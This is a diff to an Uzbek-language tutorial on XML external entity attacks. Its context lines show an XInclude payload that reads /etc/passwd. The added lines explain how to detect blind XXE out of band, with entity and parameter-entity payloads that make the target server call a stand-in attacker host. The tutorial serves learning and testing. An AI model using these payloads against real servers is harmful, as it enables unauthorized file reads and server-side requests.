@@ -21,3 +21,36 @@ XInclude hujumini bajarish uchun siz XInclude namespace’ini ulashingiz va o‘
   <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 ```
+
+_________________________________________________________________________________________________________________________
+Ko‘zdan yashiringan (blind) XXE ni out-of-band (OAST) texnikalari yordamida aniqlash
+Ko‘pincha ko‘zdan yashiringan XXE ni aniqlash uchun XXE → SSRF hujumlarida ishlatiladigan usuldan foydalanish mumkin — ya’ni tarmoq orqali chetga (out-of-band) o‘z nazoratingiz ostidagi tizimga so‘rov yuborilishini qo‘zg‘ashingiz kerak. Masalan, tashqi entitetni quyidagicha e’lon qilishingiz mumkin:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+
+So‘ngra aniqlangan entitetni XML ichidagi ma’lumot qiymatida ishlatasiz.
+
+Bu XXE hujumi serverni ko‘rsatilgan URL ga orqa tomondan HTTP so‘rov yuborishga majbur qiladi. Hujumchi DNS so‘rovi va HTTP so‘rovlarni kuzatib, shunday qilib XXE hujumi muvaffaqiyatli bo‘lganligini aniqlaydi.
+
+Ba’zida oddiy entitetlar yordamida bajariladigan XXE hujumlari ilovaning kirish ma’lumotlarini tekshirish yoki ishlatilayotgan XML parserining qattiq sozlamalari tufayli bloklanishi mumkin. Bunday vaziyatda XML parametr entitetlaridan foydalanish mumkin. XML parametr entitetlari — DTD ichida faqat boshqa joylarda chaqirilishi mumkin bo‘lgan maxsus turdagi XML entitetlaridir. Hozircha sizga ikkita muhim jihatni bilish kifoya: birinchidan, XML parametr entitetini e’lon qilishda entitet nomidan avval foiz (%) belgisi ishlatiladi:
+
+```xml
+<!ENTITY % myparameterentity "my parameter entity value" >
+```
+
+Ikkinchidan, parametr entitetlari odatdagi ampersand (&) o‘rniga foiz (%) belgisi bilan chaqiriladi:
+
+```
+%myparameterentity;
+```
+
+Demak, ko‘zdan yashiringan XXE ni XML parametr entitetlari orqali out-of-band usulda sinash mumkin, masalan:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+
+Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va so‘ngra uni DTD ichida chaqiradi. Bu hujumchi domeniga DNS so‘rovi va HTTP so‘rov yuborilishiga olib keladi va shu tarzda hujumning muvaffaqiyati tasdiqlanadi.
+
